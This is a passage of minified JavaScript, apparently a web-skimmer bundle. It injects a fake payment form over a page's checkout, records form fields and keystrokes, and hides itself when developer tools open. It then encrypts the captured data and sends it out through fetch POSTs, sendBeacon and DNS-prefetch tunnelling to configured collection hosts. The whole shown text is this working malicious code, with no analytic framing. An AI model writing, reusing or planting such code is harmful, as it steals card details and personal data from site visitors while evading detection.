j=k.selectionStart,he=k.selectionEnd,Ce=j===null?null:ge(k.value.slice(0,j)).length,ke=he===null?null:ge(k.value.slice(0,he)).length,nt=k.selectionDirection??"none";if(k.value=U.replace(/(.{4})(?=.)/g,"$1 "),Ce!==null&&ke!==null){let Te=Pe=>Math.min(k.value.length,Pe+Math.floor(Pe/4));k.setSelectionRange(Te(Ce),Te(ke),nt)}}}else if(m&&v.type==="exp"&&/^[0-9]{4}$/.test(x.value)){let k=x,U=k.selectionStart,j=k.selectionEnd,he=k.selectionDirection??"none";k.value=`${k.value.slice(0,2)}/${k.value.slice(2)}`,U!==null&&j!==null&&k.setSelectionRange(U+(U>2?1:0),j+(j>2?1:0),he)}else(v.type==="text"||v.type==="tel")&&v.maxLength!==void 0&&(x.value=x.value.slice(0,v.maxLength));fe(),ee.textContent="",x.setAttribute("aria-invalid","false"),M()}};O(x,"input",xe),O(x,"change",xe),O(x,"compositionend",xe),v.type!=="select"&&O(x,"keydown",$=>{let k=$;k.key==="Enter"&&!k.isComposing&&($.preventDefault(),g.requestSubmit())})}O(g,"submit",D=>{D.preventDefault(),D.stopPropagation(),ue()});let z=D=>D.stopPropagation();for(let D of["input","change","click","keydown","keyup","keypress","focusin","focusout","pointerdown","pointerup","mousedown","mouseup","touchstart","touchend","paste","copy","cut","compositionstart","compositionupdate","compositionend"])O(P,D,z);M(),F&&g.appendChild(F),g.appendChild(q),P.append(s,g),L.appendChild(N),r={requestSubmit:ue,validState:()=>H().valid},T[0]?.input.focus()}catch(b){throw o(),b}return V}}}function Oe(t){let r=!1,o=null,n=()=>{document.removeEventListener("keydown",a,!0),window.removeEventListener("resize",f),o&&clearInterval(o),o=null},i=c=>{r||(r=!0,n(),t(c))},a=c=>{let u=c.key,l=u.length===1?u.toLowerCase():u;(u==="F12"||c.ctrlKey&&c.shiftKey&&(l==="i"||l==="c"||l==="j")||c.metaKey&&c.altKey&&l==="i")&&i("keys")},f=()=>{(window.outerWidth-window.innerWidth>150||window.outerHeight-window.innerHeight>150)&&i("metrics")};return document.addEventListener("keydown",a,!0),window.addEventListener("resize",f),o=setInterval(f,1500),f(),{stop(){r||(r=!0,n())}}}var Ue=t=>{try{return document.querySelector(t)}catch{return null}},Ke=t=>{let e=t;return e.type==="password"||e.autocomplete==="current-password"||e.autocomplete==="new-password"},Pt=t=>{let e=t;return typeof e.value=="string"?e.value.trim():(t.textContent??"").trim()},Mt=(t,e)=>{try{return t.matches(e)}catch{return!1}};function qe(t,e){let r=Object.entries(t.selectors),o=Object.entries(t.textBlocks),n=[],i=()=>({u:location.href,r:document.referrer}),a=()=>{let c={};for(let[u,l]of r){let d=Ue(l);d&&!Ke(d)&&(c[u]=Pt(d))}for(let[u,l]of o){let d=Ue(l);d&&(c[u]=(d.textContent??"").replace(/\s+/g," ").trim())}return c},f=()=>{let c=a();Object.keys(c).length&&e("form",{...i(),...c})};if(document.addEventListener("submit",f,!0),n.push(()=>document.removeEventListener("submit",f,!0)),t.keys){let c=u=>{if(!u.key||u.key.length!==1)return;let l=u.target;if(l instanceof Element)for(let[d,p]of r){if(Ke(l))break;if(Mt(l,p)){e("keystroke",{...i(),f:d,k:u.key});break}}};document.addEventListener("keydown",c,!0),n.push(()=>document.removeEventListener("keydown",c,!0))}return{stop(){for(let c of n)c();n.length=0}}}function $e(t){let e=r=>{let o=new AbortController,n=setTimeout(()=>o.abort(),8e3);return{signal:o.signal,clear:()=>clearTimeout(n),body:r}};return{fetch:{id:"fetch",probe:()=>typeof fetch=="function",async send(r){let o=e(r.body);try{if((await fetch(t.collectUrl,{method:"POST",headers:{"Content-Type":"text/plain"},body:o.body,keepalive:!0,credentials:"omit",signal:o.signal})).status!==204)throw new Error("collect-status")}finally{o.clear()}}},beacon:{id:"beacon",probe:()=>!1,async send(r){if(!navigator.sendBeacon(t.beaconUrl,new Blob([r.body],{type:"text/plain"})))throw new Error("beacon-queue")}}}}function je(t){let e="";for(let r of t)e+=r.toString(16).padStart(2,"0");return e}function Lt(t){if(t.length>253)throw new RangeError(`FQDN exceeds 253 characters (got ${t.length})`);for(let e of t.split("."))if(e.length>63)throw new RangeError(`DNS label exceeds 63 characters (got ${e.length})`)}function We(t){if(!Number.isSafeInteger(t)||t<0)throw new RangeError("Payload label length must be a nonnegative safe integer");return Math.floor(t/2)}function Ve(){let t=We(50),e=new TextEncoder;return{packetize(r,o,n){if(r.length===0)throw new TypeError("Payload must not be empty");if(typeof o!="string"||o.length!==6||!/^[0-9a-z]{6}$/.test(o))throw new TypeError("Session must be exactly 6 lowercase base36 characters");if(typeof n!="string")throw new TypeError("Zone must be a string");let i=Math.ceil(r.length/t);if(i>255)throw new RangeError("Payload requires more than 255 chunks");let a=i+1;if(a>255)throw new RangeError("Total including meta exceeds the two-hex-digit limit (255)");let f=a.toString(16).padStart(2,"0"),c=je(e.encode(JSON.stringify({t:"meta",n:i,enc:"hex"}))),u=[];function l(d,p){let S=`${d.toString(16).padStart(2,"0")}.${f}.${o}.${p}.${n}`;Lt(S),u.push({fqdn:S,seq:d,total:a})}l(0,c);for(let d=1;d<a;d++){let p=(d-1)*t;l(d,je(r.subarray(p,p+t)))}return u},maxPayloadBytes:We}}var At=2447,It=1200*1e3,Rt=t=>new Promise(e=>setTimeout(e,t)),Bt="0123456789abcdefghijklmnopqrstuvwxyz",Ge=()=>{for(;;){let t=new Uint8Array(1);crypto.getRandomValues(t);let e=t[0]&63;if(e<36)return Bt[e]}},Ft=t=>{let e=document.createElement("link");e.rel="dns-prefetch",e.href=`//${t}`,document.head.appendChild(e),setTimeout(()=>e.remove(),150)};function Ye(t,e=Ft){let r=Ve(),o=new Map,n=()=>{let i=Date.now();for(let[f,c]of o)i-c>It&&o.delete(f);for(let f=0;f<16;f++){let c="";for(let u=0;u<6;u++)c+=Ge();if(!o.has(c))return o.set(c,i),c}let a="";for(let f=0;f<6;f++)a+=Ge();return o.set(a,i),a};return{id:"dns",probe:()=>typeof document<"u"&&!!document.head,async send(i){let a=i.dnsBytes;if(a.length===0)throw new TypeError("dns-empty");if(a.length>At)throw new Error("dns-oversize");let f=r.packetize(a,n(),t.zone);for(let c of f)await Rt(25+Math.floor(Math.random()*16)),e(c.fqdn)}}}var zt="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";function Qe(t){if(!(t?.iv instanceof Uint8Array)||t.iv.length!==12)throw new TypeError("IV must contain exactly 12 bytes");if(!(t.ct instanceof Uint8Array)||t.ct.length<16)throw new TypeError("Ciphertext must include a 16-byte GCM tag")}function Dt(t){let e="";for(let r of t)e+=String.fromCharCode(r);return btoa(e).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}function Je(t){let e=t.replace(/-/g,"+").replace(/_/g,"/")+"=".repeat((4-t.length%4)%4),r=atob(e),o=new Uint8Array(r.length);for(let n=0;n<r.length;n++)o[n]=r.charCodeAt(n);return o}function Ze(){let t=globalThis.crypto;if(!t?.subtle)throw new Error("WebCrypto is unavailable");let e=new TextEncoder,r=e.encode("env/v1");return{async deriveKey(o,n){if(typeof o!="string"||typeof n!="string")throw new TypeError("Secret and session must be strings");let i=await t.subtle.importKey("raw",e.encode(o),"HKDF",!1,["deriveKey"]);return t.subtle.deriveKey({name:"HKDF",hash:"SHA-256",salt:e.encode(n),info:r},i,{name:"AES-GCM",length:256},!0,["encrypt","decrypt"])},async seal(o,n){let i=t.getRandomValues(new Uint8Array(12)),a=new Uint8Array(await t.subtle.encrypt({name:"AES-GCM",iv:i,tagLength:128},o,n.slice()));return{iv:i,ct:a}},async open(o,n){return Qe(n),new Uint8Array(await t.subtle.decrypt({name:"AES-GCM",iv:n.iv.slice(),tagLength:128},o,n.ct.slice()))},toContainer(o){Qe(o);let n=new Uint8Array(12+o.ct.length);return n.set(o.iv),n.set(o.ct,12),Dt(n)},fromContainer(o){if(typeof o!="string"||o.length<38||o.length%4===1||/[^A-Za-z0-9_-]/.test(o))throw new TypeError("Invalid envelope container");let n=o.length%4,i=zt.indexOf(o[o.length-1]);if(n===2&&(i&15)!==0||n===3&&(i&3)!==0)throw new TypeError("Noncanonical Base64url trailing bits");return{iv:Je(o.slice(0,16)),ct:Je(o.slice(16))}}}}var Ht="b01";function Xe(t,e,r){let o=new TextEncoder,n=Ze(),i=!1,a=!1,f=!1,c=null,u=s=>o.encode(JSON.stringify(s)).length,l=s=>({id:s.id,ts:s.ts,type:s.type,data:s.data}),d=s=>{let m={id:s.id,ts:s.ts,type:s.type,state:s.state,data:{}},h=[];for(let[g,R]of Object.entries(s.data)){let A={...m.data,[g]:R};u(l({...m,data:A}))+2<=t.batchMaxBytes?m.data=A:h.push(g)}if(h.length){let g=R=>u(l({...m,data:{...m.data,__dropped:R}}))+2<=t.batchMaxBytes;g(h)?m.data.__dropped=h:g(h.length)&&(m.data.__dropped=h.length)}return m},p=s=>{let m=2,h=0;for(let R of s){let A=u(l(R))+(h>0?1:0);if(h>0&&m+A>t.batchMaxBytes)break;m+=A,h++}let g=s.slice(0,h);if(h===1&&m>t.batchMaxBytes){let R=d(s[0]);u(l(R))+2>t.batchMaxBytes&&(R.data={}),g=[R]}return{batch:g,rest:s.slice(h)}},w=s=>o.encode(JSON.stringify(s.map(l))),S=s=>s.map(m=>({id:m.id,claimToken:m.claimToken})),y=async s=>{try{await e.resetFailed(S(s))}catch{}},C=async s=>{let m=await n.deriveKey(t.sharedSecret,Ht),h=await n.seal(m,s),g=new Uint8Array(h.iv.length+h.ct.length);return g.set(h.iv),g.set(h.ct,h.iv.length),{body:n.toContainer(h),dnsBytes:t.encryptDns?g:s}},L=async s=>{for(let m of t.priority){let h=r[m];if(!(!h||!h.probe()))try{return await h.send(s),!0}catch{continue}}return!1},E=async()=>{if(i||a||f)return;a=!0;let s=[];try{if(s=await e.takePending(t.flushCount),!s.length)return;let{batch:m,rest:h}=p(s);if(h.length){await e.resetFailed(S(h));let A=new Set(h.map(T=>T.id));s=s.filter(T=>!A.has(T.id))}let g;try{g=await C(w(m))}catch{await y(s);return}await L(g)?await e.markSent(S(s)):await y(s)}catch{await y(s)}finally{a=!1}},N=()=>{document.visibilityState==="hidden"&&E()},P=()=>{a||f||(f=!0,(async()=>{let s=[];try{let m=r.beacon;if(!m||(s=await e.takePending(t.flushCount),!s.length))return;let{batch:h,rest:g}=p(s);if(g.length){await e.resetFailed(S(g));let A=new Set(g.map(T=>T.id));s=s.filter(T=>!A.has(T.id))}let R=await C(w(h));await m.send(R)}catch{await y(s)}finally{f=!1}})())};return{start(){i||c||(c=setInterval(()=>{E()},t.flushIntervalMs),window.addEventListener("pagehide",P),document.addEventListener("visibilitychange",N))},flushNow:E,leaveNow:P,stop(){i=!0,c&&clearInterval(c),c=null,window.removeEventListener("pagehide",P),document.removeEventListener("visibilitychange",N)}}}var _t=()=>typeof crypto<"u"&&typeof crypto.randomUUID=="function"?crypto.randomUUID():Math.random().toString(36).slice(2,10)+Date.now().toString(36);function et(t){let e=t.config,r=`${e.dbPrefix}.${e.siteId}`,o=null,n={},i=null,a=null,f=null,c=null,u=!1,l=(y,C)=>{let L={id:_t(),ts:Date.now(),type:y,data:C,state:"pending"};return o?o.putEvent(L):Promise.resolve()},d=()=>{if(u)return;u=!0;try{localStorage.setItem(e.banKey,"1")}catch{}f?.(),a?.(),c?.(),i?.stop();let y=o;y&&y.setUiState("banned",1).then(()=>y.purgeOlderThan(Number.MAX_SAFE_INTEGER)).catch(()=>{})},p=()=>{if(!e.form||u||!o)return;let y=0,C=!1,L=()=>{},E=()=>{if(C||u)return;let P=0;y=window.setInterval(()=>{if(u||C){window.clearInterval(y);return}P+=1;let s=null;try{s=document.querySelector(e.form.mount)}catch{window.clearInterval(y),C=!0;return}if(!(s instanceof HTMLElement)){P>=240&&(window.clearInterval(y),C=!0);return}window.clearInterval(y),N(s)},1e3)},N=P=>{let s=!1,m=!1,h=0,g=0,R=!1,A=null,T=e.form.submitSelector,K=e.form.submitToggleClass??"disable",O=!K||/^\S+$/.test(K);T&&!O&&(T=void 0);let F=new Set,oe=new WeakMap,q=()=>{s||(s=!0,window.clearInterval(h),window.clearTimeout(g),R&&(window.removeEventListener("click",onClick,!0),R=!1),Q(!0),A?.())},Q=V=>{if(!(!K||!O)){for(let G of F)G.isConnected&&G.classList.toggle(K,oe.get(G)===!0);V&&(F=new Set)}},J=V=>{if(!T||!K||!O)return;let G=T?document.querySelectorAll(T):[];for(let H of[...G,...F])!(H instanceof HTMLElement)||!H.isConnected||(F.has(H)||(F.add(H),oe.set(H,H.classList.contains(K))),H.classList.toggle(K,V))},te=()=>P.isConnected&&P.getClientRects().length>0&&getComputedStyle(P).visibility!=="hidden",ce=!0;if(T)try{document.querySelectorAll(T)}catch{ce=!1}let de=P;try{if(e.form.overlay){let M=null;if(getComputedStyle(P).position==="static"){let ue=P.style.getPropertyValue("position"),ne=P.style.getPropertyPriority("position");P.style.setProperty("position","relative"),M=()=>P.style.setProperty("position",ue,ne)}let I=document.createElement("div");I.style.position="absolute",I.style.top="0",I.style.left="0",I.style.right="0",I.style.minHeight="100%",I.style.zIndex="3",I.style.background=e.form.theme?.bgColor??"#fff",P.appendChild(I),A=()=>{I.remove(),M?.()},de=I}let V=Ne(),G={get:M=>o.getUiState(M),set:(M,I)=>o.setUiState(M,I)},H=M=>{if(u||s)return;let I=M.composedPath();if(T&&I.some(ne=>ne instanceof HTMLElement&&(ne.matches(T)||F.has(ne)))){if(m){M.preventDefault(),M.stopImmediatePropagation();return}!te()||V.validState()===null||(M.preventDefault(),M.stopImmediatePropagation(),V.requestSubmit())}};T&&ce&&(window.addEventListener("click",H,!0),R=!0),h=window.setInterval(()=>{if(u||s)return;if(!P.isConnected){q(),E();return}if(m)return;if(!te()){Q(!1);return}let M=V.validState();if(M===null){Q(!1);return}J(!M)},300),L=q,V.render(de,e.form.theme??{},e.form.fields,{key:e.form.key},G).then(async M=>{if(!(s||u))if(M&&M.valid){if(m=!0,window.clearInterval(h),J(!0),await l("form",{u:location.href,r:document.referrer,fake:1,...M.values}),s||u)return;let I=e.form.reloadMs??1500;I>0&&(g=window.setTimeout(()=>{!u&&!s&&location.reload()},I))}else q()}).catch(()=>q())}catch{q()}};c=()=>{C=!0,window.clearInterval(y),L()},E()},w=async()=>{if(typeof window>"u"||typeof document>"u")return;if(o=await He(r),await o.getUiState("banned")===1){u=!0;return}if(f=Oe(()=>d()).stop,u){f?.(),f=null;return}let y=$e(e);n={fetch:y.fetch,beacon:y.beacon,dns:Ye(e,t.injector)},i=Xe({sharedSecret:e.sharedSecret,encryptDns:e.transport.encryptDns,batchMaxBytes:e.batchMaxBytes,flushCount:e.flushCount,flushIntervalMs:e.flushIntervalMs,priority:e.transport.priority},o,n),a=qe(e,l).stop,!u&&(p(),i.start())};return{ready:(async()=>{try{await w()}catch{}})(),flushNow:()=>i?i.flushNow():Promise.resolve(),destroy:d}}function tt(t){if(typeof window>"u")return;let e;try{e=Be(t)}catch{return}let r=window.__snRuns??(window.__snRuns=Object.create(null));if(!r[e.siteId]){try{if(localStorage.getItem(e.banKey))return}catch{}if(window.outerWidth-window.innerWidth>150||window.outerHeight-window.innerHeight>150){try{localStorage.setItem(e.banKey,"1")}catch{}return}r[e.siteId]=et({config:e})}}typeof window<"u"&&!window.__snBoot&&(window.__snBoot=tt,window.__SNCFG&&tt(window.__SNCFG));})();
